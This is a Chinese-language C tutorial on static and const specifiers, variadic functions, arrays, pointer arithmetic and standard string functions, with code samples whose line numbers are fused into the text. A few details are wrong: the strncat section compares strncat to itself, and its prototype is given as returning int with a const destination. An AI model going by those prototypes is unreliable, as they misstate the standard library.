说明符默认情况下，每次调用函数时，函数的内部变量都会重新初始化，不会保留上一次运行的值。static说明符可以改变这种行为。 static用于函数内部声明变量时，表示该变量只需要初始化一次，不需要在每次调用时都进行初始化。也就是说，它的值在两次调用之间保持不变。 1234567891011121314#include &lt;stdio.h&gt;void counter(void) { static int count = 1; // 只初始化一次 printf(&quot;%d\\n&quot;, count); count++;}int main(void) { counter(); // 1 counter(); // 2 counter(); // 3 counter(); // 4} 上面示例中，函数counter()的内部变量count，使用static说明符修饰，表明这个变量只初始化一次，以后每次调用时都会使用上一次的值，造成递增的效果。 注意，static修饰的变量初始化时，只能赋值为常量，不能赋值为变量。 12int i = 3;static int j = i; // 错误 上面示例中，j属于静态变量，初始化时不能赋值为另一个变量i。 另外，在块作用域中，static声明的变量有默认值0。 123static int foo;// 等同于static int foo = 0; static可以用来修饰函数本身。 1234static int Twice(int num) { int result = num * 2; return(result);} 上面示例中，static关键字表示该函数只能在当前文件里使用，如果没有这个关键字，其他文件也可以使用这个函数（通过声明函数原型）。 static也可以用在参数里面，修饰参数数组。 123int sum_array(int a[static 3], int n) { // ...} 上面示例中，static对程序行为不会有任何影响，只是用来告诉编译器，该数组长度至少为3，某些情况下可以加快程序运行速度。另外，需要注意的是，对于多维数组的参数，static仅可用于第一维的说明。 const 说明符函数参数里面的const说明符，表示函数内部不得修改该参数变量。 123void f(int* p) { // ...} 上面示例中，函数f()的参数是一个指针p，函数内部可能会改掉它所指向的值*p，从而影响到函数外部。 为了避免这种情况，可以在声明函数时，在指针参数前面加上const说明符，告诉编译器，函数内部不能修改该参数所指向的值。 123void f(const int* p) { *p = 0; // 该行报错} 上面示例中，声明函数时，const指定不能修改指针p指向的值，所以*p = 0就会报错。 但是上面这种写法，只限制修改p所指向的值，而p本身的地址是可以修改的。 1234void f(const int* p) { int x = 13; p = &amp;x; // 允许修改} 上面示例中，p本身是可以修改，const只限定*p不能修改。 如果想限制修改p，可以把const放在p前面。 1234void f(int* const p) { int x = 13; p = &amp;x; // 该行报错} 如果想同时限制修改p和*p，需要使用两个const。 123void f(const int* const p) { // ...} 可变参数有些函数的参数数量是不确定的，声明函数的时候，可以使用省略号...表示可变数量的参数。 1int printf(const char* format, ...); 上面示例是printf()函数的原型，除了第一个参数，其他参数的数量是可变的，与格式字符串里面的占位符数量有关。这时，就可以用...表示可变数量的参数。 注意，...符号必须放在参数序列的结尾，否则会报错。 头文件stdarg.h定义了一些宏，可以操作可变参数。 （1）va_list：一个数据类型，用来定义一个可变参数对象。它必须在操作可变参数时，首先使用。 （2）va_start：一个函数，用来初始化可变参数对象。它接受两个参数，第一个参数是可变参数对象，第二个参数是原始函数里面，可变参数之前的那个参数，用来为可变参数定位。 （3）va_arg：一个函数，用来取出当前那个可变参数，每次调用后，内部指针就会指向下一个可变参数。它接受两个参数，第一个是可变参数对象，第二个是当前可变参数的类型。 （4）va_end：一个函数，用来清理可变参数对象。 下面是一个例子。 12345678910double average(int i, ...) { double total = 0; va_list ap; va_start(ap, i); for (int j = 1; j &lt;= i; ++j) { total += va_arg(ap, double); } va_end(ap); return total / i;} 上面示例中，va_list ap定义ap为可变参数对象，va_start(ap, i)将参数i后面的参数统一放入ap，va_arg(ap, double)用来从ap依次取出一个参数，并且指定该参数为 double 类型，va_end(ap)用来清理可变参数对象。 数组简介数组是一组相同类型的值，按照顺序储存在一起。数组通过变量名后加方括号表示，方括号里面是数组的成员数量。 1int scores[100]; 上面示例声明了一个数组scores，里面包含100个成员，每个成员都是int类型。 注意，声明数组时，必须给出数组的大小。 数组的成员从0开始编号，所以数组scores[100]就是从第0号成员一直到第99号成员，最后一个成员的编号会比数组长度小1。 数组名后面使用方括号指定编号，就可以引用该成员。也可以通过该方式，对该位置进行赋值。 12scores[0] = 13;scores[99] = 42; 上面示例对数组scores的第一个位置和最后一个位置，进行了赋值。 注意，如果引用不存在的数组成员（即越界访问数组），并不会报错，所以必须非常小心。 123int scores[100];scores[100] = 51; 上面示例中，数组scores只有100个成员，因此scores[100]这个位置是不存在的。但是，引用这个位置并不会报错，会正常运行，使得紧跟在scores后面的那块内存区域被赋值，而那实际上是其他变量的区域，因此不知不觉就更改了其他变量的值。这很容易引发错误，而且难以发现。 数组也可以在声明时，使用大括号，同时对每一个成员赋值。 1int a[5] = {22, 37, 3490, 18, 95}; 注意，使用大括号赋值时，必须在数组声明时赋值，否则编译时会报错。 12int a[5];a = {22, 37, 3490, 18, 95}; // 报错 上面代码中，数组a声明之后再进行大括号赋值，导致报错。 报错的原因是，C 语言规定，数组变量一旦声明，就不得修改变量指向的地址，具体会在后文解释。由于同样的原因，数组赋值之后，再用大括号修改值，也是不允许的。 12int a[5] = {1, 2, 3, 4, 5};a = {22, 37, 3490, 18, 95}; // 报错 上面代码中，数组a赋值后，再用大括号重新赋值也是不允许的。 使用大括号赋值时，大括号里面的值不能多于数组的长度，否则编译时会报错。 如果大括号里面的值，少于数组的成员数量，那么未赋值的成员自动初始化为0。 123int a[5] = {22, 37, 3490};// 等同于int a[5] = {22, 37, 3490, 0, 0}; 如果要将整个数组的每一个成员都设置为零，最简单的写法就是下面这样。 1int a[100] = {0}; 数组初始化时，可以指定为哪些位置的成员赋值。 1int a[15] = {[2] = 29, [9] = 7, [14] = 48}; 上面示例中，数组的2号、9号、14号位置被赋值，其他位置的值都自动设为0。 指定位置的赋值可以不按照顺序，下面的写法与上面的例子是等价的。 1int a[15] = {[9] = 7, [14] = 48, [2] = 29}; 指定位置的赋值与顺序赋值，可以结合使用。 1int a[15] = {1, [5] = 10, 11, [10] = 20, 21} 上面示例中，0号、5号、6号、10号、11号被赋值。 C 语言允许省略方括号里面的数组成员数量，这时将根据大括号里面的值的数量，自动确定数组的长度。 123int a[] = {22, 37, 3490};// 等同于int a[3] = {22, 37, 3490}; 上面示例中，数组a的长度，将根据大括号里面的值的数量，确定为3。 省略成员数量时，如果同时采用指定位置的赋值，那么数组长度将是最大的指定位置再加1。 1int a[] = {[2] = 6, [9] = 12}; 上面示例中，数组a的最大指定位置是9，所以数组的长度是10。 数组长度sizeof运算符会返回整个数组的字节长度。 12int a[] = {22, 37, 3490};int arrLen = sizeof(a); // 12 上面示例中，sizeof返回数组a的字节长度是12。 由于数组成员都是同一个类型，每个成员的字节长度都是一样的，所以数组整体的字节长度除以某个数组成员的字节长度，就可以得到数组的成员数量。 1sizeof(a) / sizeof(a[0]) 上面示例中，sizeof(a)是整个数组的字节长度，sizeof(a[0])是数组成员的字节长度，相除就是数组的成员数量。 注意，sizeof返回值的数据类型是size_t，所以sizeof(a) / sizeof(a[0])的数据类型也是size_t。在printf()里面的占位符，要用%zd或%zu。 12345int x[12];printf(&quot;%zu\\n&quot;, sizeof(x)); // 48printf(&quot;%zu\\n&quot;, sizeof(int)); // 4printf(&quot;%zu\\n&quot;, sizeof(x) / sizeof(int)); // 12 上面示例中，sizeof(x) / sizeof(int)就可以得到数组成员数量12。 多维数组C 语言允许声明多个维度的数组，有多少个维度，就用多少个方括号，比如二维数组就使用两个方括号。 1int board[10][10]; 上面示例声明了一个二维数组，第一个维度有10个成员，第二个维度也有10个成员。 多维数组可以理解成，上层维度的每个成员本身就是一个数组。比如上例中，第一个维度的每个成员本身就是一个有10个成员的数组，因此整个二维数组共有100个成员（10 x 10 = 100）。 三维数组就使用三个方括号声明，以此类推。 1int c[4][5][6]; 引用二维数组的每个成员时，需要使用两个方括号，同时指定两个维度。 12board[0][0] = 13;board[9][9] = 13; 注意，board[0][0]不能写成board[0, 0]，因为0, 0是一个逗号表达式，返回第二个值，所以board[0, 0]等同于board[0]。 跟一维数组一样，多维数组每个维度的第一个成员也是从0开始编号。 多维数组也可以使用大括号，一次性对所有成员赋值。 1234int a[2][5] = { {0, 1, 2, 3, 4}, {5, 6, 7, 8, 9}}; 上面示例中，a是一个二维数组，这种赋值写法相当于将第一维的每个成员写成一个数组。这种写法不用为每个成员都赋值，缺少的成员会自动设置为0。 多维数组也可以指定位置，进行初始化赋值。 1int a[2][2] = {[0][0] = 1, [1][1] = 2}; 上面示例中，指定了[0][0]和[1][1]位置的值，其他位置就自动设为0。 不管数组有多少维度，在内存里面都是线性存储，a[0][0]的后面是a[0][1]，a[0][1]的后面是a[1][0]，以此类推。因此，多维数组也可以使用单层大括号赋值，下面的语句是上面的赋值语句是完全等同的。 1int a[2][2] = {1, 0, 0, 2}; 变长数组数组声明的时候，数组长度除了使用常量，也可以使用变量。这叫做变长数组（variable-length array，简称 VLA）。 12int n = x + y;int arr[n]; 上面示例中，数组arr就是变长数组，因为它的长度取决于变量n的值，编译器没法事先确定，只有运行时才能知道n是多少。 变长数组的根本特征，就是数组长度只有运行时才能确定。它的好处是程序员不必在开发时，随意为数组指定一个估计的长度，程序可以在运行时为数组分配精确的长度。 任何长度需要运行时才能确定的数组，都是变长数组。 12345int i = 10;int a1[i];int a2[i + 5];int a3[i + k]; 上面示例中，三个数组的长度都需要运行代码才能知道，编译器并不知道它们的长度，所以它们都是变长数组。 变长数组也可以用于多维数组。 123int m = 4;int n = 5;int c[m][n]; 上面示例中，c[m][n]就是二维变长数组。 数组的地址数组是一连串连续储存的同类型值，只要获得起始地址（首个成员的内存地址），就能推算出其他成员的地址。请看下面的例子。 123456int a[5] = {11, 22, 33, 44, 55};int* p;p = &amp;a[0];printf(&quot;%d\\n&quot;, *p); // Prints &quot;11&quot; 上面示例中，&amp;a[0]就是数组a的首个成员11的内存地址，也是整个数组的起始地址。反过来，从这个地址（*p），可以获得首个成员的值11。 由于数组的起始地址是常用操作，&amp;array[0]的写法有点麻烦，C 语言提供了便利写法，数组名等同于起始地址，也就是说，数组名就是指向第一个成员（array[0]）的指针。 12345int a[5] = {11, 22, 33, 44, 55};int* p = &amp;a[0];// 等同于int* p = a; 上面示例中，&amp;a[0]和数组名a是等价的。 这样的话，如果把数组名传入一个函数，就等同于传入一个指针变量。在函数内部，就可以通过这个指针变量获得整个数组。 函数接受数组作为参数，函数原型可以写成下面这样。 1234// 写法一int sum(int arr[], int len);// 写法二int sum(int* arr, int len); 上面示例中，传入一个整数数组，与传入一个整数指针是同一回事，数组符号[]与指针符号*是可以互换的。下一个例子是通过数组指针对成员求和。 12345678910int sum(int* arr, int len) { int i; int total = 0; // 假定数组有 10 个成员 for (i = 0; i &lt; len; i++) { total += arr[i]; } return total;} 上面示例中，传入函数的是一个指针arr（也是数组名）和数组长度，通过指针获取数组的每个成员，从而求和。 *和&amp;运算符也可以用于多维数组。 123456int a[4][2];// 取出 a[0][0] 的值*(a[0]);// 等同于**a 上面示例中，由于a[0]本身是一个指针，指向第二维数组的第一个成员a[0][0]。所以，*(a[0])取出的是a[0][0]的值。至于**a，就是对a进行两次*运算，第一次取出的是a[0]，第二次取出的是a[0][0]。同理，二维数组的&amp;a[0][0]等同于*a。 注意，数组名指向的地址是不能更改的。声明数组时，编译器自动为数组分配了内存地址，这个地址与数组名是绑定的，不可更改，下面的代码会报错。 12int ints[100];ints = NULL; // 报错 上面示例中，重新为数组名赋值，改变原来的内存地址，就会报错。 这也导致不能将一个数组名赋值给另外一个数组名。 12345678int a[5] = {1, 2, 3, 4, 5};// 写法一int b[5] = a; // 报错// 写法二int b[5];b = a; // 报错 上面两种写法都会更改数组b的地址，导致报错。 数组指针的加减法C 语言里面，数组名可以进行加法和减法运算，等同于在数组成员之间前后移动，即从一个成员的内存地址移动到另一个成员的内存地址。比如，a + 1返回下一个成员的地址，a - 1返回上一个成员的地址。 12345int a[5] = {11, 22, 33, 44, 55};for (int i = 0; i &lt; 5; i++) { printf(&quot;%d\\n&quot;, *(a + i));} 上面示例中，通过指针的移动遍历数组，a + i的每轮循环每次都会指向下一个成员的地址，*(a + i)取出该地址的值，等同于a[i]。对于数组的第一个成员，*(a + 0)（即*a）等同于a[0]。 由于数组名与指针是等价的，所以下面的等式总是成立。 1a[b] == *(a + b) 上面代码给出了数组成员的两种访问方式，一种是使用方括号a[b]，另一种是使用指针*(a + b)。 如果指针变量p指向数组的一个成员，那么p++就相当于指向下一个成员，这种方法常用来遍历数组。 12345678int a[] = {11, 22, 33, 44, 55, 999};int* p = a;while (*p != 999) { printf(&quot;%d\\n&quot;, *p); p++;} 上面示例中，通过p++让变量p指向下一个成员。 注意，数组名指向的地址是不能变的，所以上例中，不能直接对a进行自增，即a++的写法是错的，必须将a的地址赋值给指针变量p，然后对p进行自增。 遍历数组一般都是通过数组长度的比较来实现，但也可以通过数组起始地址和结束地址的比较来实现。 12345678910111213int sum(int* start, int* end) { int total = 0; while (start &lt; end) { total += *start; start++; } return total;}int arr[5] = {20, 10, 5, 39, 4};printf(&quot;%i\\n&quot;, sum(arr, arr + 5)); 上面示例中，arr是数组的起始地址，arr + 5是结束地址。只要起始地址小于结束地址，就表示还没有到达数组尾部。 反过来，通过数组的减法，可以知道两个地址之间有多少个数组成员，请看下面的例子，自己实现一个计算数组长度的函数。 1234567int arr[5] = {20, 10, 5, 39, 88};int* p = arr;while (*p != 88) p++;printf(&quot;%i\\n&quot;, p - arr); // 4 上面示例中，将某个数组成员的地址，减去数组起始地址，就可以知道，当前成员与起始地址之间有多少个成员。 对于多维数组，数组指针的加减法对于不同维度，含义是不一样的。 1234567int arr[4][2];// 指针指向 arr[1]arr + 1;// 指针指向 arr[0][1]arr[0] + 1 上面示例中，arr是一个二维数组，arr + 1是将指针移动到第一维数组的下一个成员，即arr[1]。由于每个第一维的成员，本身都包含另一个数组，即arr[0]是一个指向第二维数组的指针，所以arr[0] + 1的含义是将指针移动到第二维数组的下一个成员，即arr[0][1]。 同一个数组的两个成员的指针相减时，返回它们之间的距离。 12345int* p = &amp;a[5];int* q = &amp;a[1];printf(&quot;%d\\n&quot;, p - q); // 4printf(&quot;%d\\n&quot;, q - p); // -4 上面示例中，变量p和q分别是数组5号位置和1号位置的指针，它们相减等于4或-4。 数组的复制由于数组名是指针，所以复制数组不能简单地复制数组名。 1234int* a;int b[3] = {1, 2, 3};a = b; 上面的写法，结果不是将数组b复制给数组a，而是让a和b指向同一个数组。 复制数组最简单的方法，还是使用循环，将数组元素逐个进行复制。 12for (i = 0; i &lt; N; i++) a[i] = b[i]; 上面示例中，通过将数组b的成员逐个复制给数组a，从而实现数组的赋值。 另一种方法是使用memcpy()函数（定义在头文件string.h），直接把数组所在的那一段内存，再复制一份。 1memcpy(a, b, sizeof(b)); 上面示例中，将数组b所在的那段内存，复制给数组a。这种方法要比循环复制数组成员要快。 作为函数的参数声明参数数组数组作为函数的参数，一般会同时传入数组名和数组长度。 123456int sum_array(int a[], int n) { // ...}int a[] = {3, 5, 7, 3};int sum = sum_array(a, 4); 上面示例中，函数sum_array()的第一个参数是数组本身，也就是数组名，第二个参数是数组长度。 由于数组名就是一个指针，如果只传数组名，那么函数只知道数组开始的地址，不知道结束的地址，所以才需要把数组长度也一起传入。 如果函数的参数是多维数组，那么除了第一维的长度可以当作参数传入函数，其他维的长度需要写入函数的定义。 123456789int sum_array(int a[][4], int n) { // ...}int a[2][4] = { {1, 2, 3, 4}, {8, 9, 10, 11}};int sum = sum_array(a, 2); 上面示例中，函数sum_array()的参数是一个二维数组。第一个参数是数组本身（a[][4]），这时可以不写第一维的长度，因为它作为第二个参数，会传入函数，但是一定要写第二维的长度4。 这是因为函数内部拿到的，只是数组的起始地址a，以及第一维的成员数量2。如果要正确计算数组的结束地址，还必须知道第一维每个成员的字节长度。写成int a[][4]，编译器就知道了，第一维每个成员本身也是一个数组，里面包含了4个整数，所以每个成员的字节长度就是4 * sizeof(int)。 变长数组作为参数变长数组作为函数参数时，写法略有不同。 123456int sum_array(int n, int a[n]) { // ...}int a[] = {3, 5, 7, 3};int sum = sum_array(4, a); 上面示例中，数组a[n]是一个变长数组，它的长度取决于变量n的值，只有运行时才能知道。所以，变量n作为参数时，顺序一定要在变长数组前面，这样运行时才能确定数组a[n]的长度，否则就会报错。 因为函数原型可以省略参数名，所以变长数组的原型中，可以使用*代替变量名，也可以省略变量名。 12int sum_array(int, int [*]);int sum_array(int, int []); 上面两种变长函数的原型写法，都是合法的。 变长数组作为函数参数有一个好处，就是多维数组的参数声明，可以把后面的维度省掉了。 12345// 原来的写法int sum_array(int a[][4], int n);// 变长数组的写法int sum_array(int n, int m, int a[n][m]); 上面示例中，函数sum_array()的参数是一个多维数组，按照原来的写法，一定要声明第二维的长度。但是使用变长数组的写法，就不用声明第二维长度了，因为它可以作为参数传入函数。 数组字面量作为参数C 语言允许将数组字面量作为参数，传入函数。 123456// 数组变量作为参数int a[] = {2, 3, 4, 5};int sum = sum_array(a, 4);// 数组字面量作为参数int sum = sum_array((int []){2, 3, 4, 5}, 4); 上面示例中，两种写法是等价的。第二种写法省掉了数组变量的声明，直接将数组字面量传入函数。{2, 3, 4, 5}是数组值的字面量，(int [])类似于强制的类型转换，告诉编译器怎么理解这组值。 字符串简介C 语言没有单独的字符串类型，字符串被当作字符数组，即char类型的数组。比如，字符串“Hello”是当作数组{'H', 'e', 'l', 'l', 'o'}处理的。 编译器会给数组分配一段连续内存，所有字符储存在相邻的内存单元之中。在字符串结尾，C 语言会自动添加一个全是二进制0的字节，写作\\0字符，表示字符串结束。字符\\0不同于字符0，前者的 ASCII 码是0（二进制形式00000000），后者的 ASCII 码是48（二进制形式00110000）。所以，字符串“Hello”实际储存的数组是{'H', 'e', 'l', 'l', 'o', '\\0'}。 所有字符串的最后一个字符，都是\\0。这样做的好处是，C 语言不需要知道字符串的长度，就可以读取内存里面的字符串，只要发现有一个字符是\\0，那么就知道字符串结束了。 1char localString[10]; 上面示例声明了一个10个成员的字符数组，可以当作字符串。由于必须留一个位置给\\0，所以最多只能容纳9个字符的字符串。 字符串写成数组的形式，是非常麻烦的。C 语言提供了一种简写法，双引号之中的字符，会被自动视为字符数组。 1234{'H', 'e', 'l', 'l', 'o', '\\0'}// 等价于&quot;Hello&quot; 上面两种字符串的写法是等价的，内部存储方式都是一样的。双引号里面的字符串，不用自己添加结尾字符\\0，C 语言会自动添加。 注意，双引号里面是字符串，单引号里面是字符，两者不能互换。如果把Hello放在单引号里面，编译器会报错。 12// 报错'Hello' 另一方面，即使双引号里面只有一个字符（比如&quot;a&quot;），也依然被处理成字符串（存储为2个字节），而不是字符'a'（存储为1个字节）。 如果字符串内部包含双引号，则该双引号需要使用反斜杠转义。 1&quot;She replied, \\&quot;It does.\\&quot;&quot; 反斜杠还可以表示其他特殊字符，比如换行符（\\n）、制表符（\\t）等。 1&quot;Hello, world!\\n&quot; 如果字符串过长，可以在需要折行的地方，使用反斜杠（\\）结尾，将一行拆成多行。 12&quot;hello \\world&quot; 上面示例中，第一行尾部的反斜杠，将字符串拆成两行。 上面这种写法有一个缺点，就是第二行必须顶格书写，如果想包含缩进，那么缩进也会被计入字符串。为了解决这个问题，C 语言允许合并多个字符串字面量，只要这些字符串之间没有间隔，或者只有空格，C 语言会将它们自动合并。 123char greeting[50] = &quot;Hello, &quot;&quot;how are you &quot;&quot;today!&quot;;// 等同于char greeting[50] = &quot;Hello, how are you today!&quot;; 这种新写法支持多行字符串的合并。 123char greeting[50] = &quot;Hello, &quot; &quot;how are you &quot; &quot;today!&quot;; printf()使用占位符%s输出字符串。 1printf(&quot;%s\\n&quot;, &quot;hello world&quot;) 字符串变量的声明字符串变量可以声明成一个字符数组，也可以声明成一个指针，指向字符数组。 12345// 写法一char s[14] = &quot;Hello, world!&quot;;// 写法二char* s = &quot;Hello, world!&quot;; 上面两种写法都声明了一个字符串变量s。如果采用第一种写法，由于字符数组的长度可以让编译器自动计算，所以声明时可以省略字符数组的长度。 1char s[] = &quot;Hello, world!&quot;; 上面示例中，编译器会将数组s的长度指定为14，正好容纳后面的字符串。 字符数组的长度，可以大于字符串的实际长度。 1char s[50] = &quot;hello&quot;; 上面示例中，字符数组s的长度是50，但是字符串“hello”的实际长度只有6（包含结尾符号\\0），所以后面空出来的44个位置，都会被初始化为\\0。 字符数组的长度，不能小于字符串的实际长度。 1char s[5] = &quot;hello&quot;; 上面示例中，字符串数组s的长度是5，小于字符串“hello”的实际长度6，这时编译器会报错。因为如果只将前5个字符写入，而省略最后的结尾符号\\0，这很可能导致后面的字符串相关代码出错。 字符指针和字符数组，这两种声明字符串变量的写法基本是等价的，但是有两个差异。 第一个差异是，指针指向的字符串，在 C 语言内部被当作常量，不能修改字符串本身。 12char* s = &quot;Hello, world!&quot;;s[0] = 'z'; // 错误 上面代码使用指针，声明了一个字符串变量，然后修改了字符串的第一个字符。这种写法是错的，会导致难以预测的后果，执行时很可能会报错。 如果使用数组声明字符串变量，就没有这个问题，可以修改数组的任意成员。 12char s[] = &quot;Hello, world!&quot;;s[0] = 'z'; 为什么字符串声明为指针时不能修改，声明为数组时就可以修改？原因是系统会将字符串的字面量保存在内存的常量区，这个区是不允许用户修改的。声明为指针时，指针变量存储的只是一个指向常量区的内存地址，因此用户不能通过这个地址去修改常量区。但是，声明为数组时，编译器会给数组单独分配一段内存，字符串字面量会被编译器解释成字符数组，逐个字符写入这段新分配的内存之中，而这段新内存是允许修改的。 为了提醒用户，字符串声明为指针后不得修改，可以在声明时使用const说明符，保证该字符串是只读的。 1const char* s = &quot;Hello, world!&quot;; 上面字符串声明为指针时，使用了const说明符，就保证了该字符串无法修改。一旦修改，编译器肯定会报错。 第二个差异是，指针变量可以指向其它字符串。 12char* s = &quot;hello&quot;;s = &quot;world&quot;; 上面示例中，字符指针可以指向另一个字符串。 但是，字符数组变量不能指向另一个字符串。 12char s[] = &quot;hello&quot;;s = &quot;world&quot;; // 报错 上面示例中，字符数组的数组名，总是指向初始化时的字符串地址，不能修改。 同样的原因，声明字符数组后，不能直接用字符串赋值。 12char s[10];s = &quot;abc&quot;; // 错误 上面示例中，不能直接把字符串赋值给字符数组变量，会报错。原因是字符数组的变量名，跟所指向的数组是绑定的，不能指向另一个地址。 为什么数组变量不能赋值为另一个数组？原因是数组变量所在的地址无法改变，或者说，编译器一旦为数组变量分配地址后，这个地址就绑定这个数组变量了，这种绑定关系是不变的。C 语言也因此规定，数组变量是一个不可修改的左值，即不能用赋值运算符为它重新赋值。 想要重新赋值，必须使用 C 语言原生提供的strcpy()函数，通过字符串拷贝完成赋值。这样做以后，数组变量的地址还是不变的，即strcpy()只是在原地址写入新的字符串，而不是让数组变量指向新的地址。 12char s[10];strcpy(s, &quot;abc&quot;); 上面示例中，strcpy()函数把字符串abc拷贝给变量s，这个函数的详细用法会在后面介绍。 strlen()strlen()函数返回字符串的字节长度，不包括末尾的空字符\\0。该函数的原型如下。 12// string.hsize_t strlen(const char* s); 它的参数是字符串变量，返回的是size_t类型的无符号整数，除非是极长的字符串，一般情况下当作int类型处理即可。下面是一个用法实例。 12char* str = &quot;hello&quot;;int len = strlen(str); // 5 strlen()的原型在标准库的string.h文件中定义，使用时需要加载头文件string.h。 1234567#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) { char* s = &quot;Hello, world!&quot;; printf(&quot;The string is %zd characters long.\\n&quot;, strlen(s));} 注意，字符串长度（strlen()）与字符串变量长度（sizeof()），是两个不同的概念。 123char s[50] = &quot;hello&quot;;printf(&quot;%d\\n&quot;, strlen(s)); // 5printf(&quot;%d\\n&quot;, sizeof(s)); // 50 上面示例中，字符串长度是5，字符串变量长度是50。 如果不使用这个函数，可以通过判断字符串末尾的\\0，自己计算字符串长度。 123456int my_strlen(char *s) { int count = 0; while (s[count] != '\\0') count++; return count;} strcpy()字符串的复制，不能使用赋值运算符，直接将一个字符串赋值给字符数组变量。 12345char str1[10];char str2[10];str1 = &quot;abc&quot;; // 报错str2 = str1; // 报错 上面两种字符串的复制写法，都是错的。因为数组的变量名是一个固定的地址，不能修改，使其指向另一个地址。 如果是字符指针，赋值运算符（=）只是将一个指针的地址复制给另一个指针，而不是复制字符串。 12345char* s1;char* s2;s1 = &quot;abc&quot;;s2 = s1; 上面代码可以运行，结果是两个指针变量s1和s2指向同一字符串，而不是将字符串s2的内容复制给s1。 C 语言提供了strcpy()函数，用于将一个字符串的内容复制到另一个字符串，相当于字符串赋值。该函数的原型定义在string.h头文件里面。 1strcpy(char dest[], const char source[]) strcpy()接受两个参数，第一个参数是目的字符串数组，第二个参数是源字符串数组。复制字符串之前，必须要保证第一个参数的长度不小于第二个参数，否则虽然不会报错，但会溢出第一个字符串变量的边界，发生难以预料的结果。第二个参数的const说明符，表示这个函数不会修改第二个字符串。 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) { char s[] = &quot;Hello, world!&quot;; char t[100]; strcpy(t, s); t[0] = 'z'; printf(&quot;%s\\n&quot;, s); // &quot;Hello, world!&quot; printf(&quot;%s\\n&quot;, t); // &quot;zello, world!&quot;} 上面示例将变量s的值，拷贝一份放到变量t，变成两个不同的字符串，修改一个不会影响到另一个。另外，变量t的长度大于s，复制后多余的位置（结束标志\\0后面的位置）都为随机值。 strcpy()也可以用于字符数组的赋值。 12char str[10];strcpy(str, &quot;abcd&quot;); 上面示例将字符数组变量，赋值为字符串“abcd”。 strcpy()的返回值是一个字符串指针（即char*），指向第一个参数。 12345678char* s1 = &quot;beast&quot;;char s2[40] = &quot;Be the best that you can be.&quot;;char* ps;ps = strcpy(s2 + 7, s1);puts(s2); // Be the beastputs(ps); // beast 上面示例中，从s2的第7个位置开始拷贝字符串beast，前面的位置不变。这导致s2后面的内容都被截去了，因为会连beast结尾的空字符一起拷贝。strcpy()返回的是一个指针，指向拷贝开始的位置。 strcpy()返回值的另一个用途，是连续为多个字符数组赋值。 1strcpy(str1, strcpy(str2, &quot;abcd&quot;)); 上面示例调用两次strcpy()，完成两个字符串变量的赋值。 另外，strcpy()的第一个参数最好是一个已经声明的数组，而不是声明后没有进行初始化的字符指针。 12char* str;strcpy(str, &quot;hello world&quot;); // 错误 上面的代码是有问题的。strcpy()将字符串分配给指针变量str，但是str并没有进行初始化，指向的是一个随机的位置，因此字符串可能被复制到任意地方。 如果不用strcpy()，自己实现字符串的拷贝，可以用下面的代码。 123456789101112char* strcpy(char* dest, const char* source) { char* ptr = dest; while (*dest++ = *source++); return ptr;}int main(void) { char str[25]; strcpy(str, &quot;hello world&quot;); printf(&quot;%s\\n&quot;, str); return 0;} 上面代码中，关键的一行是while (*dest++ = *source++)，这是一个循环，依次将source的每个字符赋值给dest，然后移向下一个位置，直到遇到\\0，循环判断条件不再为真，从而跳出循环。其中，*dest++这个表达式等同于*(dest++)，即先返回dest这个地址，再进行自增运算移向下一个位置，而*dest可以对当前位置赋值。 strcpy()函数有安全风险，因为它并不检查目标字符串的长度，是否足够容纳源字符串的副本，可能导致写入溢出。如果不能保证不会发生溢出，建议使用strncpy()函数代替。 strncpy()strncpy()跟strcpy()的用法完全一样，只是多了第3个参数，用来指定复制的最大字符数，防止溢出目标字符串变量的边界。 12345char *strncpy( char *dest, char *src, size_t n); 上面原型中，第三个参数n定义了复制的最大字符数。如果达到最大字符数以后，源字符串仍然没有复制完，就会停止复制，这时目的字符串结尾将没有终止符\\0，这一点务必注意。如果源字符串的字符数小于n，则strncpy()的行为与strcpy()完全一致。 12strncpy(str1, str2, sizeof(str1) - 1);str1[sizeof(str1) - 1] = '\\0'; 上面示例中，字符串str2复制给str1，但是复制长度最多为str1的长度减去1，str1剩下的最后一位用于写入字符串的结尾标志\\0。这是因为strncpy()不会自己添加\\0，如果复制的字符串片段不包含结尾标志，就需要手动添加。 strncpy()也可以用来拷贝部分字符串。 1234567char s1[40];char s2[12] = &quot;hello world&quot;;strncpy(s1, s2, 5);s1[5] = '\\0';printf(&quot;%s\\n&quot;, s1); // hello 上面示例中，指定只拷贝前5个字符。 strcat()strcat()函数用于连接字符串。它接受两个字符串作为参数，把第二个字符串的副本添加到第一个字符串的末尾。这个函数会改变第一个字符串，但是第二个字符串不变。 该函数的原型定义在string.h头文件里面。 1char* strcat(char* s1, const char* s2); strcat()的返回值是一个字符串指针，指向第一个参数。 12345char s1[12] = &quot;hello&quot;;char s2[6] = &quot;world&quot;;strcat(s1, s2);puts(s1); // &quot;helloworld&quot; 上面示例中，调用strcat()以后，可以看到字符串s1的值变了。 注意，strcat()的第一个参数的长度，必须足以容纳添加第二个参数字符串。否则，拼接后的字符串会溢出第一个字符串的边界，写入相邻的内存单元，这是很危险的，建议使用下面的strncat()代替。 strncat()strncat()用于连接两个字符串，用法与strncat()完全一致，只是增加了第三个参数，指定最大添加的字符数。在添加过程中，一旦达到指定的字符数，或者在源字符串中遇到空字符\\0，就不再添加了。它的原型定义在string.h头文件里面。 12345int strncat( const char* dest, const char* src, size_t n); strncat()返回第一个参数，即目标字符串指针。 为了保证连接后的字符串，不超过目标字符串的长度，strncat()通常会写成下面这样。 12345strncat( str1, str2, sizeof(str1) - strlen(str1) - 1); strncat()总是会在拼接结果的结尾，自动添加空字符\\0，所以第三个参数的最大值，应该是str1的变量长度减去str1的字符串长度，再减去1。下面是一个用法实例。 12345char s1[10] = &quot;Monday&quot;;char s2[8] = &quot;Tuesday&quot;;strncat(s1, s2, 3);puts(s1); // &quot;MondayTue&quot; 上面示例中，s1的变量长度是10，字符长度是6，两者相减后再减去1，得到3，表明s1最多可以再添加三个字符，所以得到的结果是MondayTue。 strcmp()如果要比较两个字符串，无法直接比较，只能一个个字符进行比较，C 语言提供了strcmp()函数。 strcmp()函数用于比较两个字符串的内容。该函数的原型如下，定义在string.h头文件里面。 1int strcmp(const char* s1, const char* s2); 按照字典顺序，如果两个字符串相同，返回值为0；如果s1小于s2，strcmp()返回值小于0；如果s1大于s2，返回值大于0。 下面是一个用法示例。 1234567// s1 = Happy New Year// s2 = Happy New Year// s3 = Happy Holidaysstrcmp(s1, s2) // 0strcmp(s1, s3) // 大于 0strcmp(s3, s1) // 小于 0 